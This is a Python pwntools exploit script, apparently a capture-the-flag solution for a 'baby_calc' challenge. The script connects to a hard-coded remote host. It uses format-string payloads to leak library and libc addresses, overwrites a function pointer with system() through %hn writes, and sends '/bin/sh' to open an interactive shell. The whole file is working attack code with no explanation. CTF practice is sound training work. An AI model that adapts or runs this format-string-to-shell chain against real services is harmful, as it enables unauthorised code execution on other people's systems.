#!/usr/bin/env python3

from pwn import *

if args.LOCAL:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', checksec=False)
else:
    libc = ELF('./libc.so.6', checksec=False)
context.arch='amd64'

def conn():
    if args.LOCAL:
        r = process('java -Djava.library.path=. -Dfile.encoding=UTF-8 Main'.split())
        if args.DEBUG:
            gdb.attach(r)
    else:
        # r = remote('127.0.0.1', 9003)
        r = remote("45.122.249.68", 20028)
    return r

def GDB():     # Wsl2
    import os
    script = '''
    #!/bin/sh

    cd /home/johnathanhuutri/baby_calc
    '''
    script += f'gdb -p {p.pid} -x /tmp/command.gdb'
    with open('/tmp/script.sh', 'w') as f: f.write(script)
    os.system("chmod +x /tmp/script.sh")

    command = '''
    b*convert+185
    b*convert+366
    c
    '''
    with open('/tmp/command.gdb', 'w') as f: f.write(command)
    q = process(f'cmd.exe /c start C:\\Windows\\system32\\wsl.exe /tmp/script.sh'.split())
    input()

p = conn()

########################################
### Stage 1: Leak libconvert address ###
########################################
# Append the string
payload = b'%29$p\0' + p32(-22, sign=True)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', payload.ljust(0x400, b'A'))
for i in range(62):
    p.sendlineafter(b'6. Exit\n', b'4')
    p.sendafter(b'string: ', b'A'*0x400)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', b'B'*0x3ff)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', b'C'*(1+len(payload)-4))

# Execute convert
p.sendlineafter(b'6. Exit\n', b'2')
libconvert_leak = int(p.recvuntil(b'Welcome', drop=True), 16)
libconvert_base = libconvert_leak - 0x19fd
log.info("Libconvert base: " + hex(libconvert_base))

##################################
### Stage 2: Leak libc address ###
##################################
# Reset the string
p.sendlineafter(b'6. Exit\n', b'5')

# Append the string
payload = b'%11$s\0\0\0' + p64(libconvert_base + 0x4030) + p32(-22, sign=True)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', payload.ljust(0x400, b'A'))
for i in range(62):
    p.sendlineafter(b'6. Exit\n', b'4')
    p.sendafter(b'string: ', b'A'*0x400)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', b'B'*0x3ff)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', b'C'*(1+len(payload)-4))

# Execute convert
p.sendlineafter(b'6. Exit\n', b'2')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['printf']
log.info("Libc base: " + hex(libc.address))

#####################################
### Stage 3: Write system address ###
#####################################
part1 = (libc.sym['system'] >> 0) & 0xffff
part2 = (libc.sym['system'] >> 16) & 0xffff
if part2<(part1 & 0xffff):
    part2 |= 0x10000

# Reset the string
p.sendlineafter(b'6. Exit\n', b'5')

# Append the string
payload = f'%{part1}c%18$hn'.encode()
payload += f'%{part2 - (part1 & 0xffff)}c%19$hn'.encode()
payload = payload.ljust(0x40, b'P')
payload += flat(
    libconvert_base + 0x40e0,
    libconvert_base + 0x40e0+2,
    )
payload += p32(-22, sign=True)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', payload.ljust(0x400, b'A'))
for i in range(62):
    p.sendlineafter(b'6. Exit\n', b'4')
    p.sendafter(b'string: ', b'A'*0x400)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', b'B'*0x3ff)
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', b'C'*(1+len(payload)-4))

# Execute convert
p.sendlineafter(b'6. Exit\n', b'2')

##########################
### Stage 4: Get shell ###
##########################
# Reset the string
p.sendlineafter(b'6. Exit\n', b'5')

# Append the string
payload = b'/bin/sh\0'
p.sendlineafter(b'6. Exit\n', b'4')
p.sendafter(b'string: ', payload)

# Execute convert
p.sendlineafter(b'6. Exit\n', b'1')

p.interactive()